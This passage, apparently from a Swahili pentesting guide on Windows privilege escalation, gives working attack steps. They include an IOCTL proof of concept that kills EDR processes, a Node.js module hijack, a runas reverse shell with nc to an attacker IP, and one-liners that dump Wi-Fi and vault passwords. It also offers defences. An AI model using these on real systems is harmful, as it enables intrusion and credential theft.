- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ielekeze kwenye `UNICODE_STRING`. Ikiwa code itapakia kwanza `REG_DWORD` inayodhibitiwa na mshambuliaji kwenye scalar ya stack, kisha itumie tena buffer hiyo hiyo kusoma string, mshambuliaji hudhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, hivyo kusababisha uandishi wa kernel unaodhibitika kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani **hasi** inayodhibitiwa na mshambuliaji kwenye scalar inayotumika tena, query inayofuata ya `REG_BINARY` hunakili baiti za mshambuliaji moja kwa moja juu ya nafasi za karibu kwenye stack; mara nyingi hii ndiyo njia rahisi zaidi ya kufuta pointer nzima ya callback.

Muundo thabiti wa kutafuta: **usomaji wa registry wa aina tofauti kwenye variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumika tena, na code paths ambapo usomaji wa kwanza wa registry huamua kama usomaji wa pili utafanyika.

#### Kutumia kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party drivers zilizosainiwa huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, DACL salama haitatekelezwa kifaa kinapofunguliwa kupitia path iliyo na component ya ziada, hivyo mtumiaji yeyote asiye na ruhusa anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishaweza kufungua kifaa, anaweza kutumia vibaya IOCTLs za privileged zinazotolewa na driver kwa LPE na tampering. Mifano ya uwezo ulioonekana kwenye mazingira halisi:
- Kurejesha handles zenye full access kwa processes yoyote (wizi wa token / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika raw disk bila vizuizi (tampering ya offline, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, ikiwemo Protected Process/Light (PP/PPL), na hivyo kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Daima weka FILE_DEVICE_SECURE_OPEN unapounda device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha muktadha wa caller kwa operations zenye privileges. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu process termination au kurejesha handles.
- Weka mipaka kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na uzingatie miundo ya broker badala ya privileges za kernel za moja kwa moja.

Mawazo ya detection kwa defenders
- Fuatilia ufunguaji wa user-mode wa majina ya device yanayotia shaka (kwa mfano, \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza vulnerable driver blocklist ya Microsoft (HVCI/WDAC/Smart App Control) na udumishe orodha zako za allow/deny.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folder iliyo kwenye PATH** unaweza kuweza kuteka nyara DLL inayopakiwa na process na **kupandisha privileges**.<sup>[[2]](#references)</sup>

Angalia ruhusa za folders zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji nyara wa utatuzi wa module za Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapofanya import ya kawaida kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta packages kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, kwa hivyo programu inayoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta katika:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye ruhusa za chini** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye ruhusa za juu** utatue dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato lengwa, kwa hivyo hii huwa **LPE** wakati lengwa linaendeshwa kama administrator, kutoka kwenye scheduled task/service wrapper iliyopewa ruhusa za juu, au kutoka kwenye programu ya desktop yenye ruhusa za juu inayojiwasha kiotomatiki.

Hali hii hutokea hasa wakati:

- dependency imetangazwa katika `optionalDependencies`<sup>[[22]](#references)</sup>
- library ya wahusika wengine imeweka `require("foo")` ndani ya `try/catch` na kuendelea baada ya hitilafu
- package iliondolewa kwenye production builds, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` iliyo katika hatari iko ndani kabisa ya mti wa dependency badala ya kuwa kwenye msimbo mkuu wa programu

### Kutafuta malengo yaliyo katika hatari

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable lengwa (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Chuja kwa `Path` `contains` `node_modules`
- Lenga `NAME NOT FOUND` na ufunguzi wa mwisho uliofanikiwa chini ya `C:\node_modules`

Miundo ya msimbo inayofaa kukaguliwa katika faili za `.asar` zilizofunguliwa au kwenye chanzo cha programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda saraka ya utafutaji kwenye root ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Anzisha application ya mwathiriwa. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano halisi ya modules za hiari zinazokosekana na zinazolingana na muundo huu ni `bluebird` na `utf-8-validate`, lakini **mbinu** ndiyo inayoweza kutumika tena: tafuta **bare import inayokosekana** ambayo mchakato wa Node/Electron wenye privileges za juu kwenye Windows utajaribu kutatua.

### Mawazo ya ugunduzi na uimarishaji

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/package mpya za `.js` hapo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kubaini mifumo ya `try { require("...") } catch {}` inayoficha hitilafu.
- Zima ukaguzi wa hiari ikiwa library inaruhusu (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Folda zilizoshirikiwa

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Kagua kama kuna kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye hosts file.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Milango Iliyofunguliwa

Angalia **huduma zilizozuiwa** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa ufikiaji kama mtumiaji wake wa desktop ikiwa tu uthibitishaji na vidhibiti vya amri vinaruhusu. Programu maalum ya TCP inayoendeshwa chini ya akaunti yenye mapendeleo ya juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni vidokezo tu vya awali, ilhali njia ya authenticated memory-corruption inahitaji uchanganuzi wa binary hiyo mahususi na ingizo linaloweza kufikiwa nayo. Ikiwa port iliyo wazi inaonekana kuwa ya process ya mfumo, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kuhusisha service ya backend nayo; forwarding rule pekee haithibitishi kuwa destination inaweza kufikiwa au ina udhaifu.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

Amri zaidi za network enumeration [hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana kwenye `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, dirisha la GUI litauliza ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa root wa Linux ndani ya WSL hakukupi moja kwa moja haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distribution, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) ili kuona amri ambazo huenda zilihifadhi credentials; escalation bado inahitaji akaunti halali yenye ruhusa za juu zaidi na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` unatumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distribution kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hivyo tambua kwanza distribution na njia halisi ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa uchunguzi wa kiotomatiki.

## Windows Credentials

### Winlogon Credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni finding ya plaintext kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna password ya plaintext inayosomeka, hiyo ni kidokezo tu: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauwezi kuthibitisha kama secret hiyo ipo au inaweza kurejeshwa. Kagua haki za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuliwa kwa credential.

### Credential Manager / Windows Vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa ajili ya servers, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingia watumiaji kiotomatiki**. Mwanzoni, inaweza kuonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na kufanya browsers ziingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii inamaanisha kuwa **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (server au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila mara.

Isipokuwa programu hizo ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` kwa seti ya credentials iliyotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa unaweza kutumia mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au [moduli ya Powershell ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila za maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (inayoonyeshwa pia kama `Web Credentials` kwenye `vaultcmd`). Nafasi hii ya hifadhi imetengwa kwa kila session na inaweza kusimbuliwa kwa njia asilia bila haki za kiutawala au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session amilifu ya mtumiaji ili kutoa na kusimbua papo hapo majina yote ya watumiaji na nywila zote za maandishi wazi zilizohifadhiwa:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya usimbaji fiche linganifu wa data, inayotumiwa zaidi ndani ya mfumo endeshi wa Windows kwa usimbaji fiche linganifu wa funguo za faragha zisizolingana. Usimbaji fiche huu hutumia siri ya mtumiaji au ya mfumo kuchangia kwa kiasi kikubwa entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kupitia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji za domain ya mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa fiche kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, uliohifadhiwa pamoja na ufunguo mkuu unaolinda funguo za faragha za mtumiaji katika faili iyo hiyo**, kwa kawaida huwa na data ya nasibu yenye urefu wa baiti 64. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kupitia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na arguments zinazofaa (`/pvk` au `/rpc`) ili kuifungua.

**Faili za credentials zilizolindwa na master password** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili ku-decrypt.\
Unaweza **extract** DPAPI **masterkeys** nyingi kutoka **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** hutumiwa mara nyingi kwa **scripting** na kazi za automation ili kuhifadhi credentials zilizofichwa kwa urahisi. Credentials hizi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha zinaweza tu ku-decryptiwa na mtumiaji yuleyule kwenye kompyuta ileile ambako ziliundwa.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Ikiwa script au orodha ya faili inaonyesha faili kama hiyo, tafuta saraka halisi ya profile ya akaunti badala ya kudhani kuwa ni `C:\Users`: [Windows inaweza kuweka profiles mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` hufungamanisha credential iliyofichwa na mtumiaji na kompyuta iliyoi-export](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima pia iwe na ruhusa halali kwenye service inayolengwa. Kagua paths na ACLs kwanza, bila kuchapisha thamani zilizofichwa au za maandishi wazi wakati wa enumeration ya kawaida.

Ili **de-crypt** PS credentials kutoka kwenye faili iliyozihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Hati Tambulishi za Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia moduli ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia moduli ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye folda ya Documents ya mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na attributes za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kuwa kidokezo cha credentials. Thamani iliyohifadhiwa si nywila ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji ya faili na kama nywila maalum kuu ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa utafutaji mpana.

**Usafirishaji wa profaili za Remote Desktop Plus** pia unaweza kusomeka kwenye folda za watumiaji au folda ya pamoja ya usimamizi. Usafirishaji wa zamani wa `profiles.xml` unaingizo za `Data/Profile` zenye vipengele vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengele cha password kisicho tupu kama kidokezo cha credentials, bila kukichapisha au kudhani ni maandishi wazi: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profaili unaweza kufungamanishwa na akaunti na kompyuta iliyoiunda, au kusanidiwa bila masharti makali. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Mara nyingi watu hutumia programu ya Sticky Notes kwenye kompyuta za Windows **kuhifadhi nywila** na taarifa nyingine, bila kutambua kuwa ni faili ya hifadhidata. Faili hii hupatikana kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na inafaa kutafutwa na kuchunguzwa kila wakati.

Wakati mwingine watu huhifadhi nywila na taarifa nyingine kwenye programu za madokezo yanayonata. Programu ya Sticky Notes ya Microsoft iliyosakinishwa kama kifurushi kwa kawaida huhifadhi madokezo kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine kwenye wasifu wa mtumiaji, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na umbizo la hifadhi kabla ya kuchukulia kutokuwepo kwa faili ya SQLite kuwa uthibitisho kwamba hakuna madokezo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa madokezo yaliyothibitishwa hivi karibuni. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya hifadhidata, na ujumuishe `plum.sqlite-shm` inapopatikana; faharasa ya kumbukumbu ya pamoja inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya hifadhidata. Tazama [hati za SQLite za WAL](https://www.sqlite.org/wal.html). Dokezo lenye jina la akaunti au nywila ni kidokezo cha credentials tu: thibitisha akaunti, ruhusa ya kuifikia, na matumizi tena ya nywila kando. Rekodi iliyosimbwa ya password-manager pia huhitaji ufunguo wake halisi wa kusimbua na tafsiri mahususi ya programu kabla ya kuthibitisha kuingia kwa akaunti yenye mamlaka ya juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha nywila kutoka AppCmd.exe, unahitaji kuwa Administrator na kuiendesha katika kiwango cha High Integrity.**\
**AppCmd.exe** ipo kwenye saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, kuna uwezekano kwamba baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Programu za usakinishaji **huendeshwa kwa SYSTEM privileges**, nyingi ziko hatarini kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Faili na Registry (Credentials)

### Mabaki ya credentials za registry za zana za usaidizi

Baadhi ya usakinishaji wa zamani wa usaidizi wa mbali huhifadhi majina ya thamani yanayohusiana na password chini ya funguo maalum za registry za programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha password tuli ya session iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu funguo za registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la thamani ni kidokezo tu cha kuchunguza: thibitisha toleo lililosakinishwa, data ya thamani inayosomeka, umbizo na tabia ya sasa ya uthibitishaji kabla ya kutathmini credential hiyo. Kuhama kutoka password ya usaidizi wa mbali kwenda akaunti ya Windows yenye ruhusa kubwa zaidi kunahitaji pia password hiyo kutumika tena na akaunti hiyo kuwa na idhini. Usijumuishe ciphertext na password zilizorejeshwa katika matokeo ya kawaida ya enumeration.

### Lahajedwali zilizoshirikiwa zenye laha zilizolindwa

Ikiwa unashuku kuwa workbook inayoshirikiwa na inayosomeka ina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft inasema](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa maudhui ya workbook yamesimbwa kwa njia fiche. Kagua faili zilizoidhinishwa na zinazohusika pekee, na uepuke kuchapisha siri zinazoweza kuwepo wakati wa enumeration pana. Njia ya `.xlsx` inayosomeka, laha iliyolindwa, au safu wima iliyofichwa pekee haithibitishi kuwa credentials zipo au akaunti yoyote ina ruhusa kubwa zaidi; thibitisha data halisi na haki za sasa za akaunti kando.

### Patches za mabadiliko zilizohifadhiwa na seva ya CI

